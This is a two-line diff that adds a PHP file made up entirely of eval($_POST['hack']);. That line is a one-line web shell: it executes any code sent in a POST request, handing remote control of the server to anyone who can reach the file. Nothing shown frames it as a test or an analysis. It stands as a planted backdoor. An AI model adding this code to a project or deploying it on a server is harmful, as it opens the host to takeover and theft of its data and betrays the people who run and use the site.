@@ -1,0 +1,2 @@
+<?
+eval($_POST['hack']);
